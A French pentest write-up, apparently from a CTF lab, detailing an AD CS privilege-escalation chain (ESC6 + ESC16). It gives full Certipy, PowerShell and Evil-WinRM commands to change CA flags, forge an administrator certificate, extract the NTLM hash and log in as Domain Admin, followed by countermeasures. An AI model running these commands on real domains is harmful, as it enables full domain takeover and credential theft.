# ESC6 + ESC16

## <mark style="color:red;">🏛️ ADCS — Élévation de Privilèges via ESC6 + ESC16</mark>

### <mark style="color:blue;">Concept</mark>

Active Directory Certificate Services (ADCS) est l'infrastructure PKI de Microsoft. Deux misconfigurations combinées permettent une compromission totale du domaine :

* **ESC6** : Le flag `EDITF_ATTRIBUTESUBJECTALTNAME2` autorise n'importe quel client à spécifier un UPN arbitraire dans sa requête de certificat.
* **ESC16** : La désactivation de la validation de l'extension SID (`szOID_NTDS_CA_SECURITY_EXT`) empêche Windows de vérifier que le SID correspond à l'UPN demandé.

> **Impact** : Un compte à faibles privilèges peut obtenir un certificat au nom de `administrator@domain.htb` et s'authentifier comme Domain Admin via PKINIT.

***

### <mark style="color:blue;">Prérequis</mark>

* Un compte avec le droit **ManageCa** sur la CA cible (ex: compte gMSA)
* Un compte pouvant faire de l'enrollment sur un template (ex: `Domain Users`)
* Certipy-AD, Evil-WinRM

***

### <mark style="color:blue;">Étapes d'exploitation</mark>

#### 1. Reconnaissance avec Certipy

```bash
certipy-ad find \
  -u 'gMSA_CA_prod$@domain.htb' \
  -hashes :<NTLM_HASH> \
  -dc-ip <IP_DC> \
  -vulnerable -stdout
```

Chercher dans la sortie :

* `ManageCa: DOMAIN\<votre_compte>` → vous pouvez modifier la CA
* `ESC7` ou `ESC8` → point d'entrée initial

**Si ESC7 est bloqué** (erreur `CERTSRV_E_TEMPLATE_DENIED` ou templates inaccessibles), pivoter vers ESC6+ESC16.

***

#### 2. Récupérer le SID de Administrator

```bash
# Via Certipy ou ldapsearch
certipy-ad find -u 'user@domain.htb' -p 'password' -dc-ip <IP>

# Ou avec impacket
python3 GetADUsers.py -all domain.htb/user:password -dc-ip <IP>
```

Format attendu : `S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500`

***

#### 3. Se connecter avec le compte ManageCa

```bash
evil-winrm -i <IP_DC> -u 'gMSA_CA_prod$' -H '<NTLM_HASH>'
```

***

#### 4. Activer ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2`

Depuis Evil-WinRM (PowerShell sur le DC) :

```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.domain.htb\domain-DC01-CA"

# Lire la valeur actuelle
$current = $CA.GetConfigEntry($Config,
    "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
    "EditFlags")

Write-Host "EditFlags actuel : $current"

# Ajouter le flag ESC6 (0x00040000 = 262144)
$new = $current -bor 0x00040000
$CA.SetConfigEntry($Config,
    "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
    "EditFlags",
    $new)

Restart-Service certsvc -Force
Write-Host "ESC6 activé. Nouvelle valeur : $new"
```

**Vérification :**

```powershell
certutil -config "DC01.domain.htb\domain-DC01-CA" -getreg policy\EditFlags
# Doit afficher EDITF_ATTRIBUTESUBJECTALTNAME2
```

***

#### 5. Activer ESC16 — Désactiver la validation SID

```powershell
$CA.SetConfigEntry($Config,
    "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
    "DisableExtensionList",
    "1.3.6.1.4.1.311.25.2")

Restart-Service certsvc -Force
Write-Host "ESC16 activé : validation SID désactivée"
```

**Vérification :**

```powershell
certutil -config "DC01.domain.htb\domain-DC01-CA" -getreg policy\DisableExtensionList
# Doit lister l'OID 1.3.6.1.4.1.311.25.2
```

***

#### 6. Synchroniser l'horloge (obligatoire pour Kerberos)

Kerberos refuse les requêtes avec un décalage > 5 minutes :

```bash
sudo ntpdate <IP_DC>
# Ou : sudo timedatectl set-ntp false && sudo date -s "$(curl -s ..."
```

***

#### 7. Demander le certificat malveillant

Depuis Kali, avec un compte `Domain Users` :

```bash
certipy-ad req \
  -u 'svc_infra@domain.htb' \
  -p 'PASSWORD' \
  -ca 'domain-DC01-CA' \
  -template 'User' \
  -upn 'administrator@domain.htb' \
  -sid 'S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500' \
  -dc-ip <IP_DC>
```

| Paramètre                       | Rôle                                          |
| ------------------------------- | --------------------------------------------- |
| `-template User`                | Template standard accessible aux Domain Users |
| `-upn administrator@domain.htb` | ESC6 → UPN arbitraire autorisé                |
| `-sid S-1-5-21-...-500`         | SID de l'Administrator                        |

**Résultat attendu :**

```
[*] Got certificate with UPN 'administrator@domain.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

***

#### 8. Authentification PKINIT → Récupérer le hash NTLM

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip <IP_DC>
```

```
[*] Got TGT
[*] Got hash for 'administrator@domain.htb':
    aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>
```

Le TGT est aussi sauvegardé dans `administrator.ccache` pour une utilisation directe.

***

#### 9. Connexion Domain Admin

**Via Evil-WinRM (Pass-the-Hash) :**

```bash
evil-winrm -i <IP_DC> -u 'Administrator' -H '<NTLM_HASH>'
```

**Via Kerberos (Pass-the-Cache) :**

```bash
export KRB5CCNAME=administrator.ccache
evil-winrm -i <IP_DC> -u 'Administrator' -k --no-pass
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
domain\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
```

***

### <mark style="color:blue;">Schéma de la chaîne ESC6 + ESC16</mark>

```
gMSA_CA_prod$ (ManageCa)
│
├─► Active ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2
│       → Les clients peuvent choisir n'importe quel UPN
│
├─► Active ESC16 : DisableExtensionList (OID SID)
│       → Windows ne valide plus la cohérence SID/UPN
│
svc_infra (Domain Users)
│
├─► certipy-ad req -template User -upn administrator@domain.htb
│       ↓
│   CA accepte (ESC6) + ignore SID mismatch (ESC16)
│   → administrator.pfx émis ✅
│
├─► certipy-ad auth -pfx administrator.pfx
│       ↓
│   PKINIT → TGT Administrator + hash NTLM
│
└─► evil-winrm -H <NTLM> → Domain Admin ✅
```

***

### Pourquoi ESC6 seul ne suffit pas

Sans ESC16, la validation du SID est active :

```
Requête : UPN=administrator@domain.htb, demandée par svc_infra
SID dans cert = SID de svc_infra ≠ SID Administrator
→ Windows REFUSE l'authentification PKINIT
```

La combinaison ESC6 + ESC16 est nécessaire pour bypass complet.

***

### Contre-mesures

* Ne pas attribuer `ManageCa` à des comptes de service ou des gMSA non nécessaires
* Auditer régulièrement les `EditFlags` de la CA (`EDITF_ATTRIBUTESUBJECTALTNAME2` doit être absent)
* S'assurer que `szOID_NTDS_CA_SECURITY_EXT` n'est pas dans `DisableExtensionList`
* Utiliser des templates avec `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0` (le sujet ne peut pas être modifié par le demandeur)
* Monitorer les événements Windows : ID 4886 (émission certificat) et 4887

***

### Références

* [Certipy — ESC6](https://github.com/ly4k/Certipy)
* [SpecterOps — Certified Pre-Owned](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
* [HackTricks - ADCS ESC6](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#editf_attributesubjectaltname2-esc6)
* [HackTricks - ADCS ESC16](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#esc16)
